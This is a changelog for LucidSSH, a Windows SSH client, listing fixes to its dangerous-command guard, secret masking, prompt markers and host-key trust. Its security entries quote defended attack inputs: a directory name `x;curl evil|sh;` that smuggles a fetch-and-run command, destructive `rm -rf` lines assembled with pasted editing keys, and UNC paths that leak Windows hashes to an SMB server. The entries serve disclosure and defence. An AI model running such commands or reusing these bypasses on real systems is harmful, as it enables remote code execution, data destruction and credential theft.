# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Fixed

- **The breadcrumb and prompt detection now work on Alpine and other BusyBox servers whose shell expands `\` sequences in the prompt.** There, after the first prompt the hidden marker swallowed the backslash-escape at the start of your own prompt (`\$` showed as `#`, `\w` as a literal `\w`), the marker never ended, its tail — including the session's shell-integration key — was printed on screen, and the breadcrumb, error detector and dangerous command guard stopped seeing the prompt. The marker now ends with a character no shell rewrites. Remaining limit on these servers: a directory name containing `\` sequences is shown in the breadcrumb as the shell expands it.

### Security

- **A dangerous command assembled by line-editing keys in a paste no longer slips past the guard.** Pasted text such as ` -rf ~`, `Ctrl+A`, `rm `, Enter — or ` -rf ~`, `Ctrl+U`, `rm`, `Ctrl+Y`, Enter — runs `rm -rf ~` in bash, because the shell moves the cursor and cuts and pastes text before running the line; the guard saw only `-rf ~ rm` and found nothing. Such edits can't be followed reliably across shells and editing modes, so the guard now asks for confirmation whenever pasted text both contains a line-editing key and runs a line (Enter or `Ctrl+O`); a recognised dangerous command still gets its usual dialog with the real target. The paste preview and the guard dialog now show these keys as visible symbols (`␁`, `␛`, `␡`) instead of hiding them. What is sent to the server is unchanged. Known limits: harmless pasted text that runs a line and happens to contain a control byte (a form feed in source code, colour codes copied from a log) now also asks for confirmation; a single-line paste without Enter is not checked when the app takes the session to be inside a program, though the shell then shows the assembled line before you press Enter yourself.
- **The terminal now leaves password mode only on a real prompt marker.** A "back at the prompt" signal that main guesses from a timer (the paste-echo timer) is now tagged as synthetic all the way to the renderer, and the renderer ignores it while a password prompt is active, so a future timing mistake can no longer echo a typed password in clear or put it in the up-arrow history. Without a password prompt such a signal works as before. The "shell integration unconfirmed" warning is also a timer guess: during a password prompt it still shows the warning but no longer returns the terminal to the prompt. Losing the channel clears password mode.
- **A multi-line paste no longer ends password mode early.** When a pasted block contained a command that asks for a password (for example `su`), the half-second "no echo of the next pasted line" timer could declare the shell back at the prompt while `Password:` was still waiting, so the typed password was echoed in clear and stayed in the session's up-arrow history. The timer now leaves password mode alone; only the next real prompt marker ends it. Known limits: lines pasted after the password-asking one are no longer tracked, so the terminal may count as being at the prompt a moment early until the next Enter.
- **A secret cut by the edge of saved command output is no longer stored in part.** Saved output is masked over a window just past the 4,000-character limit and then cut, but a masked value is shorter than the original, so after a long masked value the cut let raw text from past the limit into the history database — including the start of a URL password (`postgres://app:hunter2…`) whose closing `@` lay beyond the window. The stored part is now only what corresponds to the first 4,000 characters of raw output, so nothing past that point is saved. Known limit: a URL password that runs more than 512 characters past the 4,000-character mark is still not recognised and is not masked inside the stored part.
- **Server output packed with fake prompt markers can no longer slow the app down.** Since the marker rework, every `ESC _lucidssh` start in a chunk of output made the parser search the whole rest of the chunk several times, so a file or log with thousands of such starts (shown by `cat`, for example) made every session lag while it streamed. The parser now makes one forward pass over a chunk; what it cuts out, keeps and shows is unchanged. Known limit: a directory name longer than about 8 KB still overflows the marker buffer, and that prompt marker is shown as text.
- **A dangerous command pasted behind line-editing keys no longer slips past the guard.** In pasted text such as `Ctrl+U` + `rm -rf /` or `x`, `Backspace`, `rm -rf ~`, the character before `rm` was a control character rather than a space, so the guard found nothing — yet the shell applies those keys and runs `rm`. The guard now reads every control character as a space when checking pasted text; what is sent to the server is unchanged.
- **Crafted server output or import files can no longer freeze the app.** Three places made the main process spin on untrusted input: the error detector trimmed trailing whitespace from up to 64 KB of output with a backtracking pattern (seconds on a long run of spaces); the `ssh_config` import parser took seconds on a long run of `=` and read files of any size; and importing hosts with the "rename" strategy ran one database query per candidate name, so a file of 10,000 identical hosts hung the app. The detector now slices first and trims by hand, the parser reads keyword and value with non-overlapping patterns, splits lines on a lone CR too, skips lines over 4,096 characters and rejects files over 1 MB, and both imports pick free names in memory inside one transaction. Valid `Key value`, `Key=value` and `Key = value` lines parse as before. A host import is now a single transaction: if saving any host fails, none of the batch is kept, instead of a partial import.
- **Secrets in commands and saved output are now masked in more of the forms people actually type, and the masking itself can't stall the app.** A variable named just `PASSWORD=`, `TOKEN=`, `SECRET=`, `PASS=`, `KEY=` or `AUTH=` was stored in history in clear text — only names with something before the keyword, like `DB_PASSWORD=`, were caught; bare names are now masked too (so is the `PASS=` in a test-runner summary such as `TOTAL=10 PASS=9`), while names that merely begin with a keyword (`KEYMAP=`, `AUTHOR=`, `PASSWORD_FILE=`) and the shell's `PWD=` are left alone. A quoted value with spaces — `--password="my secret phrase"`, `export API_KEY='a b c'`, `Authorization: Bearer "…"` — had only its first word hidden; every rule now hides the whole shell word, quotes and anything glued to them (`"p1"$SUFFIX`), and an unclosed quote hides the rest of its line. A long uppercase word in server output could make masking take seconds in the main process; each rule now runs in a single pass, and output is masked over a bounded window just past the stored 4,000 characters and cut afterwards, so a URL password (`scheme://user:password@host`) split by the cut is still hidden.
- **The dangerous command guard now checks every line of multi-line and long input, and can't be frozen by a crafted command.** In a multi-line paste, snippet or history entry, `rm -r`, `shred` and `wipefs` were only recognised on the last line, so a dangerous command on any earlier line ran without a dialog; each line is now checked on its own, for both commands typed at the prompt and text pasted into a running program. Input longer than 10,000 characters used to skip the guard and the access-loss warning entirely — a large paste bypassed both; it is now checked whatever its length. A run of trailing redirects such as `>>a >>a …` after an `rm -r` target could make the check take exponentially long and freeze the app on a command of about 200 characters; redirects after the target are now read token by token, so even a paste of 100,000 characters is checked in milliseconds.
- **A long line that repeats a command name can no longer freeze the app while the guard checks it.** Several guard and access-loss checks (`dd`, `truncate`, `rm -r`, `chmod -R 777`, `shred`, `wipefs`, editors and `sed -i` on `sshd_config`, `iptables`, `firewall-cmd`, `systemctl stop … ssh`) re-scanned the rest of the line from every occurrence of the command name, so a single pasted line such as `dd dd dd …`, a long run of spaces after the name, or a flag like `-RRR…` stalled the app for 1 to 23 seconds at 100,000 characters. Each check now runs in a single pass and takes a few milliseconds on such input; what the guard recognises in ordinary commands is unchanged. The Unicode line and paragraph separators (U+2028, U+2029) are now treated as ordinary spaces inside `rm -r`, `shred` and `wipefs` arguments, as they already were everywhere else in the guard, so a command containing one is no longer missed.
- **The passphrase you set in the SSH key wizard no longer appears in the Windows process list.** It was passed to `ssh-keygen` as a command-line argument, which any program running as your user can read and which process-creation auditing (Event 4688, Sysmon, EDR) records in its logs. `ssh-keygen` now asks for it through `SSH_ASKPASS`, and a small helper script hands it over from its environment, so neither process's command line contains it. Keys created this way open with the same passphrase as before, including passphrases with spaces, symbols or non-Latin letters. A passphrase longer than 1023 bytes is now refused instead of being silently cut short.
- **A saved password or key passphrase is now used only for what it was saved for.** A host keeps a single saved secret, so switching it from key to password authentication without typing a new password left the old key passphrase in place — and the next connect or test sent it to the server as the login password. Saving a host with a different authentication method and no new secret now deletes the saved one, and the form no longer says a secret is saved once the method is switched. "Test connection" likewise uses the saved secret only when the address, port, username, authentication method, key and jump host match the saved host; after changing any of them, enter the secret again to test. A host switched before this update may still hold its old secret — use "Delete saved password" in its form.
- **A hosts file can no longer make Windows authenticate to an attacker's SMB server.** A host whose key path was a network or device path (`\\server\share\key`, `//server/…`, `\\?\…`, `\\.\…`) made the import preview check that path on disk before you confirmed anything, which sends your Windows login hash to that server. Such paths are now rejected everywhere a key path is accepted — host create and edit, test connection, the key-file check and import — before any file access; during import the affected hosts are skipped and counted in the preview rather than failing the whole file. Private keys on network shares are no longer supported; map the share to a drive letter instead.
- **A server that presents a host key of a different type is now treated as a changed key, not a new host.** Trust in `known_hosts` was checked per key type, so an impostor offering only a key type not yet stored for a known host (say ECDSA when ED25519 was trusted) got the gentle first-connection prompt — and on "Accept" its key was stored next to the genuine one for good. Any key that matches none of a host's trusted keys, whatever its type, now raises the changed-fingerprint warning with every previously trusted fingerprint and its key type listed, and accepting it replaces all of them. To keep honest servers that merely added a new key type from tripping the warning, the key types already trusted for a host are now offered to it first.
- **A password asked for by a pasted command is no longer shown on screen or saved to history.** After a multi-line paste such as `sudo apt update`, the terminal still believed it was at the shell prompt, so the `sudo` password you typed next was echoed in clear text and, on Enter, sent as a command and recorded in history. A confirmed multi-line paste now switches the terminal to raw input until the next shell prompt, a detected password prompt (`[sudo] password for …`, `Password:`, `Enter passphrase`) always does the same, and a line typed while such a prompt is active is never recorded as a command.
- **Clicking a catalog entry, history item, snippet or breadcrumb segment during an SSH password prompt no longer prints it in clear text.** The inserted text was echoed right after `Password:` and then prepended to the first command after login — a problem if a snippet holds a token or password. While a password or passphrase prompt is active, such inserts are now discarded; type or paste the secret instead, as before.
- **Clicking a breadcrumb segment can no longer run a command hidden in a directory name.** The `cd` it inserts was built from the path as-is, so a directory called `x;curl evil|sh;` — or a forged path printed by a file you `cat` — became part of the command line and ran on Enter. The path is now inserted as a single quoted argument, and control characters are stripped from the path, user and host the server reports.
- **Pasted or inserted text can no longer show one command and send another.** Text arriving from the clipboard, the catalog, history, snippets or the breadcrumb was echoed and buffered raw, so escape sequences inside it could move the cursor and erase part of the line on screen while the full text was still sent on Enter. Control characters (everything but Tab) are now removed from inserted text, and typed or natively pasted input additionally drops the C1 range it used to let through.
- **A password typed or pasted a moment too early or too late is no longer shown or kept.** While a session had no open shell — between two password attempts, after the last answer, or while reconnecting — nothing was masking the terminal input, so whatever you typed, pasted or inserted from the catalog, history or snippets was echoed in clear text and then prepended to your first command after login. Without an open shell, input that no password prompt is waiting for is now discarded, and a half-typed line does not survive a dropped connection.
- **"Paste" in the terminal context menu no longer reveals a password during an SSH password or passphrase prompt.** That one route bypassed the masking that `Ctrl+V` and right-click paste already had: the secret was printed in clear text after `Password:` and never reached the prompt. Every paste route now makes that decision in one place.
- **Command output is no longer kept in history unless you ask for it, and deleting history now deletes its backup copies too.** Since July 2026 the first 4,000 characters of every command's output were saved to `history.db` by default, protected only by masking rules written for command lines — private key blocks, `/etc/shadow` hashes and `https://user:password@host` URLs went in clear text. Saving output is now off by default, behind a new "Save command output" toggle in Settings → Security (inactive while history is off); without it, expanding a history entry shows a hint instead (shown up to 3 times, hidden in Expert mode). With it on, output containing a private key block or a password hash (`$1$`, `$2a$`/`$2b$`/`$2y$`, `$5$`, `$6$`, `$y$`, `$7$`) is not saved at all and the entry is marked as holding a secret, and a password in a URL is masked; a lowercase `password:` line is deliberately not masked. **On upgrade, all output saved by earlier versions is erased**, and turning the toggle off erases it again. "Clear history", "Clear this host's history" and deleting an entry used to touch only the live database while `history.db.backup-vN` copies and `backups/pre-update-*` kept every row; they now delete those copies too (the copies are a safety net, not user data, so they go whole), checkpoint the write-ahead log, and the database overwrites freed pages. Migration v5 also runs a single `VACUUM`, so output from rows deleted under earlier versions (which left it in free pages) is gone from `history.db` too. Automatic FIFO eviction at 10,000 entries does not delete copies. Backups no longer pile up: each database keeps one `.backup-vN` copy and only one `pre-update-*` folder is kept.
- **Text printed in the terminal can no longer fake the breadcrumb or the shell prompt.** The hidden marker the shell prints before each prompt carried no proof of where it came from, so a file you `cat`, a log line, the MOTD or a `wall` message from another user could contain one and make the app show a fake path, user or root colour, report a fake exit code to the error detector, or believe the shell was at a prompt while a program was still running. Each shell session now gets its own random 128-bit key, known only to the shell the app set up (and to the shell after `su` or `sudo -i`); markers without it are still hidden from the screen but change nothing.
- **A directory name can no longer fake the user, root colour or exit code in the breadcrumb, and the shell-integration key no longer shows up in the server's process list.** The current path is the one field of that marker the server controls, and it sat in the middle: a directory whose name contained the field separator shifted the fields after it, so `cd` into it could turn a normal user red or report a fake exit code, and an `ESC \` in the name cut the marker short, leaving prompt detection (and with it the guard) off in that directory. The path is now the last field, followed by the key once more; the user ID and exit code must be plain numbers; and the marker is read up to that closing key, so such a directory shows its path (control characters removed) and nothing else changes. A stray, unterminated marker start in printed text (a truncated file you `cat`) no longer swallows the next real prompt. On servers whose shell has no built-in `printf` (mksh, OpenBSD ksh, BusyBox built without it), every prompt ran the external `printf` with the key in its arguments, where other users could read it with `ps`; shell integration is now not enabled there at all — no breadcrumb, everything else works as before.
- **A code typed into a later line of a multi-line paste is no longer shown on screen or saved to history.** After "Paste and run", the prompt that came back after the *first* pasted line switched the terminal back to its at-prompt mode, so if a later line asked for a secret the app doesn't recognise as a password prompt (`read -s -p 'Code: '`, a PIN, a token), what you typed there was echoed in clear text, submitted as a command and recorded in history. The terminal now stays in raw input until the paste's last line has finished. Prompts that can't belong to the paste — after Ctrl+C, a heredoc or loop, or a program that read the remaining lines itself — are recognised because the shell doesn't echo another pasted line after them, and the terminal returns to normal within a fraction of a second. While a paste is running, a line is never recorded as a command.

## [1.0.2] — 2026-09-13

### Changed

- **Command history can now be turned off for a single host from the connection form.** The per-host setting already existed but had no control in the interface; the form now has a "Record command history" toggle, independent of the global one in Settings → Security. Commands already recorded for that host are not affected.
- **"Clear" in the History drawer now respects the host filter.** With a host selected in the filter — including "This session" and a host that has since been deleted — it removes only that host's commands, and the confirmation shows exactly how many will be removed. With "All" selected it clears everything, as before. Commands from Quick Connect sessions are grouped under their own "Quick Connect" filter: those sessions have no saved host to tell servers apart, so clearing it removes the history of every Quick Connect session, and the confirmation says so.
- **Esc now closes exactly one thing, in a consistent order, everywhere.** All 23 places that used to listen for Esc on their own — dialogs, drawers, the context menu, the snippet palette, search, the error panel, and in-place edits like a tab rename or a history note — now go through a single shared stack. The most recently opened thing closes first, regardless of where keyboard focus happens to be.
- **The dangerous command guard now names every object a compound command destroys.** `rm -rf /var/www && rm -rf /etc` used to name only the first one, so you confirmed one deletion while two were about to happen. The dialog now lists all of them and asks you to type the name of one of them — picked at random among the most severe, so the expected answer can't be learned by habit and typed without reading. Commands with a single dangerous fragment are unchanged.

### Fixed

- **Captured command output no longer starts with the shell prompt or contains raw terminal escapes.** The saved output (and the text the error detector reads) began with the previous prompt — the window-title sequence plus `user@host:~#` — and kept colour and erase codes. The prompt is now dropped at the first input after it, and escape sequences are stripped before masking. As a result the "exited with code N without an error message" text and the `2>/dev/null` exception now work on real servers, and History no longer shows `]0;…` garbage.
- `configUpdate` accepted setting paths inherited from `Object.prototype` (`toString`, `constructor`, …) and rewrote `config.json` with them; such paths are now rejected.
- **Muting a dashboard health finding during a Quick Connect session no longer silences that finding for every other Quick Connect session.** All such sessions shared one mute entry with nowhere host-specific to live. Quick Connect sessions have no saved host to attach a persistent mute to, so the "Don't show again" button is no longer shown for them; the banner's close button still works as before.
- **"Reset settings to defaults" no longer loses SSH keys pending deployment to the server, or changes the interface language.** Both used to be wiped as a side effect of the reset, alongside the actual settings — a key generated in step 4 of the SSH key wizard but not yet copied to the server would silently disappear, so the next connection attempt used a key the server didn't recognize.
- **Esc no longer leaks into the remote session while also closing a panel.** Previously the key reached xterm's own handling before the panel's listener ran (no `preventDefault`), so it did both: the control byte was sent to the server *and* the panel closed. Now Esc belongs to the open panel until it's closed.
- **Esc while editing a history note no longer closes the whole History drawer.** The note input and the drawer each listened for Esc independently; cancelling the note also closed the drawer underneath it.
- The SSH key wizard's Esc handling no longer depends on a hand-rolled `capture`/`stopPropagation` trick to avoid closing the connection form behind it — the shared stack orders it correctly by construction.
- Four surfaces that already closed on a backdrop click — the JSON host import dialog, the "Возможности LucidSSH" guide, the multi-line paste preview, and the server dashboard — now also close on Esc.
- The host import dialogs (JSON import and PuTTY/ssh_config/WinSCP import) can no longer be closed — by backdrop click, Esc, or the close button — while an import is actually being applied. Previously any of those closed the dialog immediately while the import kept running in the background, discarding the result (imported/skipped counts, errors) with no way to see it.
- **`rm -rf /` now actually has to be typed out to be confirmed.** The guard asks for the affected object's name, but the root directory has no last path segment, so the expected text was empty — the confirm button was active before you typed anything, on the single most destructive command it recognizes. It now asks you to type `/`.
- **The dangerous command guard now asks you to confirm the right object.** In a compound command whose destructive part wasn't last — `rm -rf ./node_modules && npm install` — the confirmation dialog named the tail of the whole line (`install`) instead of what was actually being deleted. The guard still blocked such commands, but the name you had to type said nothing about the danger. It now takes the object from the destructive fragment itself.
- The same fix now also covers a background launch with a single `&` — `rm -rf /var/www & echo done` asked you to confirm `done` instead of `/var/www`. A redirect like `2>&1`, `&>file`, or `>&2` is correctly left alone; it's not treated as a separator.
- **Running `top` no longer wipes the session history above it.** `top` doesn't switch to the alternate screen buffer the way `vim` or `less` do — it clears the primary screen with `ESC[H ESC[2J` and never restores it, so quitting with `q` left its last frame on screen and everything printed before it was gone for good, not even reachable by scrolling up. An erased screen is now pushed into scrollback instead of being cleared in place, which is what PuTTY does. As a side effect this also applies to `clear` and `Ctrl+L`: the screen still goes blank, but the screenful they wipe now stays reachable by scrolling up instead of being discarded.
- **Snippets no longer fail to load in a Quick Connect session.** Opening the command catalog (`Ctrl+Shift+L`) or the snippet palette (`Ctrl+Space`) during a Quick Connect session threw an IPC validation error and left both lists empty: a Quick Connect session carries no saved host, and the internal placeholder id used for it was rejected as an invalid host id. Such a session now correctly shows the global snippets, and the per-host snippet tab — which could never hold anything for a Quick Connect session, since server-scoped snippets can't be saved there — is hidden instead of shown empty.

- **`Ctrl+H` and `Ctrl+K` now work while the terminal has focus.** Opening the history drawer and Quick Connect from the keyboard silently did nothing in a focused terminal — the toolbar buttons worked, the shortcuts didn't. xterm recognizes those two as terminal input (`Ctrl+H` is Backspace, `Ctrl+K` is a kill-line) and stopped the key before the app ever saw it, while a shortcut like `Ctrl+,` — which maps to no control character — got through. All app shortcuts are now claimed before the terminal sees them, whatever they're bound to.
- **App shortcuts no longer send a stray control byte to the server on top of doing their job.** `Ctrl+F` (search) also sent `0x06` to the shell, `Ctrl+W` (close tab) also sent `0x17` — a kill-word in most shells. Only `Ctrl+Space` was handled correctly. A shortcut that the app acts on is now consumed by the app, and this holds for any combination you rebind it to.
- **Assigning a new shortcut in Settings no longer triggers the action you're rebinding.** Pressing `Ctrl+F` while capturing a combination assigned it *and* opened the terminal search behind the Settings overlay.
- **Backspace no longer eats into the prompt after the terminal is resized.** Typed input that hasn't been sent yet was erased by counting characters, without checking what was actually on screen. After a window resize (the shell redraws the prompt line) or output arriving mid-typing, Backspace could erase part of the prompt, and Enter could send a command different from the one shown. The input echo is now reconciled against the screen.
- **"Test connection" no longer makes a login attempt with an empty password** when the password field is left blank. That extra failed attempt counted toward the server's `MaxAuthTries` and could trip tools like fail2ban.

### Security

- **The "Test the connection" button no longer sends your password to a server whose host key was never checked.** For the target host, the button used to skip fingerprint verification entirely and authenticate anyway; a jump host's key was checked, but only against keys already known, so a jump host that had never been opened on its own always failed the test even though a real connection through it worked fine. Both hops now go through the same trust decision a normal connection uses: an unfamiliar or changed key shows the fingerprint and asks for confirmation before any password or key is sent. A server verified this way is remembered, so the first real connection to it doesn't ask again.

## [1.0.1] — 2026-08-05

### Added

- **Editable hotkeys**: the Settings → Hotkeys section is no longer read-only — 9 of the 11 app shortcuts can now be rebound (`Esc` and `F1` stay fixed). Assigning a combination that's already in use is blocked, with a hint showing which action currently owns it.
- The in-app changelog is now shown inline in Settings → About while an update is available or downloaded, instead of only on the GitHub Releases page.

### Fixed

- **Jump host (ProxyJump) connections now actually work.** In 1.0.0 the setting was stored, imported, and validated, but the second SSH hop was never established on a real connection attempt — every jump-host connection silently went direct instead. The jump host is now picked from your saved hosts (not a free-text alias), "Test connection" runs the full two-hop chain, deleting a host that's used as someone's jump host warns first, and `~/.ssh/config` import resolves `ProxyJump` aliases to the matching imported host.
- Clicking an update-available notification in the header bell now opens Settings → About; it previously dismissed the notification without navigating anywhere.

### Changed

- `Ctrl+L` is no longer intercepted by the app — it now reaches the shell directly and clears the screen, per the common terminal convention. The command catalog, which previously opened on `Ctrl+L`, moved to `Ctrl+Shift+L` by default.

## [1.0.0] — 2026-07-25

First release of LucidSSH — a simple SSH client for Windows. Fully local: no account, no cloud, no telemetry.

### Added

- **SSH connections**: password and private key authentication (RSA/Ed25519/ECDSA, with passphrase), server fingerprint verification on every connection with storage in `known_hosts`, ProxyJump/jump host support.
- **Host manager**: saved servers with groups, quick SSH key setup wizard, warning about keys not being portable between PCs.
- **Terminal**: multiple tabs, buffer search, context menu, live connection stepper instead of a blank terminal while the session is being established, reconnection after dropped connections.
- **Dangerous command guard**: intercepts destructive and irreversible commands (`rm -rf`, `dd`, `mkfs`, fork bombs, etc.) before they reach the server; confirmation requires typing the object's name; separate warning for commands that risk losing SSH access; can be disabled globally or per host.
- **Error detector**: offline explanation of stderr/SSH errors in Russian and English, no LLM involved; fuzzy command suggestion on "command not found"; "Copy for question" button that masks secrets automatically.
- **Breadcrumb "where am I"**: clickable path above the terminal via shell integration, status and hotkeys for the active interactive program (vim/nano/htop/man/top/less), red color for root sessions.
- **Command catalog**: sidebar with explanations in Russian/English, cards for nano/vim/htop/man/top/less.
- **Command history and snippets**: full-text search, secret masking, global and per-host snippets, manual ordering, quick-insert hotkey.
- **Server dashboard**: CPU/RAM/disk over a separate exec channel that doesn't load the main session, color-coded thresholds, one-time health banner for problems.
- **Host export/import**: JSON format without secrets, preview before import, protection against duplicates and invalid files.
- **Multi-language support**: Russian and English UI with automatic detection from the OS locale on first launch (falls back to Russian if the system language isn't supported), manual switch in settings, localized error and command databases.
- **Auto-update**: checks for new versions via GitHub Releases, manual and automatic checks, user data preserved across updates.
- **Help**: built-in guide (F1) covering getting started, snippets, the guard, the error detector, and hotkeys.

### Security

- Passwords and passphrases go through Windows Credential Manager (keytar) only — never stored in files or logs.
- `contextIsolation` is enabled; renderer has no direct access to Node.
- Secrets in command history are masked before being saved.
- The installer ships without a code-signing certificate (no Code Signing Certificate available) — integrity is verified via the SHA-256 checksum published with each release.
